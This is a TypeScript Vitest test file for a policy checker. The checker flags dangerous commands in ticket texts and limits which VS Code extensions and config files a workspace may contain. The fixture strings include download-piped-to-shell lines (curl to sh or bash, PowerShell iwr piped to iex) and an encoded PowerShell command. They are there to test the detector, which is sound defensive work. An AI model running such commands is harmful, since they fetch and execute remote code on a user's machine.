import { readFile } from 'node:fs/promises';
import { join } from 'node:path';
import { describe, expect, it } from 'vitest';
import {
  ALLOWED_VSCODE_EXTENSIONS,
  findDangerousCommands,
  textProblems,
  vscodeProblems,
} from '../../src/contract/policy.ts';

const fixtures = join(import.meta.dirname, '..', 'fixtures', 'texts');

describe('findDangerousCommands', () => {
  it('lets commands against the workspace app through', () => {
    const text = [
      'Reproduce it with `curl "http://localhost:3001/api/tickets?search=%25"`.',
      'Then `curl -X PATCH http://127.0.0.1:3001/api/tickets/3 -H "Content-Type: application/json"`.',
      'Run `npm test` in the VS Code terminal and open the DevTools.',
    ].join('\n');
    expect(findDangerousCommands(text)).toEqual([]);
  });

  it('flags downloads piped into a shell, PowerShell, cmd and global installs, with the line', () => {
    const text = [
      'Install the helper: `curl -fsSL https://example.com/setup.sh | sh`',
      'Or in PowerShell: iwr https://example.com/diag.ps1 | iex',
      'Then run powershell -EncodedCommand ZQBjAGgAbwA=',
      'cmd /c dir',
      'npm install -g some-tool',
      'winget install Some.Tool',
    ].join('\n');
    const lines = findDangerousCommands(text).map((item) => item.line);
    expect(new Set(lines)).toEqual(new Set([1, 2, 3, 4, 5, 6]));
    expect(findDangerousCommands(text)[0]).toMatchObject({ line: 1, reason: expect.stringContaining('shell') });
  });

  it("lets the real SupportDesk texts through (they only curl the project's own API)", async () => {
    for (const name of ['back-1.ticket.en.md', 'back-3.ticket.en.md']) {
      expect(findDangerousCommands(await readFile(join(fixtures, name), 'utf8'))).toEqual([]);
    }
    const hints = JSON.parse(await readFile(join(fixtures, 'back-1.hints.en.json'), 'utf8')) as { hints: string[] };
    expect(findDangerousCommands(hints.hints.join('\n'))).toEqual([]);
  });

  it('reports path, line, match and reason', () => {
    const problems = textProblems([
      { path: 'tickets/front-1/solution.en.md', text: 'Fix it.\nThen `curl https://x.test/a.sh | bash`.' },
    ]);
    // One line, two reasons: the pipe into a shell and the download from outside the workspace app.
    expect(problems).toHaveLength(2);
    expect(problems[0]).toMatch(/^tickets\/front-1\/solution\.en\.md:2: ".*\| bash" pipes a download into a shell/);
    expect(problems[1]).toMatch(/^tickets\/front-1\/solution\.en\.md:2: ".*" downloads from outside the workspace app/);
  });
});

describe('vscodeProblems', () => {
  const extensions = (ids: string[]) => ({
    path: '.vscode/extensions.json',
    text: JSON.stringify({ recommendations: ids }),
  });

  it('accepts the allowed files and extensions, in any case', () => {
    const files = [
      extensions(ALLOWED_VSCODE_EXTENSIONS.map((id) => id.toUpperCase())),
      { path: '.vscode/settings.json', text: '{}' },
      { path: '.vscode/launch.json', text: '{}' },
    ];
    expect(vscodeProblems(files)).toEqual([]);
  });

  it('refuses an extension outside the list and says where the list lives', () => {
    const problems = vscodeProblems([extensions(['dbaeumer.vscode-eslint', 'evil.helper'])]);
    expect(problems).toHaveLength(1);
    expect(problems[0]).toMatch(/extension evil\.helper is not allowed.*catalog repository/);
  });

  it('refuses files outside the list and invalid JSON', () => {
    expect(vscodeProblems([{ path: '.vscode/tasks.json', text: '{}' }])[0]).toMatch(
      /only settings\.json, extensions\.json, launch\.json/,
    );
    expect(vscodeProblems([{ path: '.vscode/extensions.json', text: '{' }])[0]).toMatch(/not valid JSON/);
    expect(vscodeProblems([{ path: 'src/index.ts', text: 'x' }])).toEqual([]);
  });
});
